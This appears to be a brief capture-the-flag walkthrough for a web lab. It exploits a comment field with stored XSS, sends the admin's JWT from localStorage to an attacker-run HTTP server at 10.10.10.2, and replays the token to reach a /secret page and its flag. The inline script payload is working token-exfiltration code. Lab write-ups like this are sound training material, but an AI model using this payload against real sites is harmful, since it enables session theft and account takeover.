We know that the Admin has a jwt and is currently viewing the coments that are
posted.
Where is the jwt?
Unfortunately, a common place to store a jwt is in localStorage. We could run
with this guess, but with some inspection we could find that our own jwt is
stored in localStorage. Maybe Admin's is also in localStorage.

0. Use dirbust on 10.10.10.1:3000. the /secret directory has a lot of goodies
on it, but you will notice that the functionalities are disabled with out Admin
token

1. Use XSS to return contents of executer's local storage to a server of your
choice (preferably one you have access to)
    a. Launch an HTTP server on your own machine
           python -m SimpleHTTPServer
    b. Inject js into comment field that will iterate through localStorage and
       send an informative request to your server
           <script>var xhttp = new XMLHttpRequest(); for (var i = 0; i < localStorage.length; i++){xhttp.open('GET', 'http://10.10.10.2:8000/?' + localStorage.key(i) + '=' + localStorage.getItem(localStorage.key(    i)), true); xhttp.send();} </script>
    c. You will see Admin's jwt in your server logs

2. Add jwt to your localStorage
    in webpage console: localStorage.setItem('jwt', '[inser jwt]')

3. Navigate to 10.10.10.1/secret and obtain 1st flag
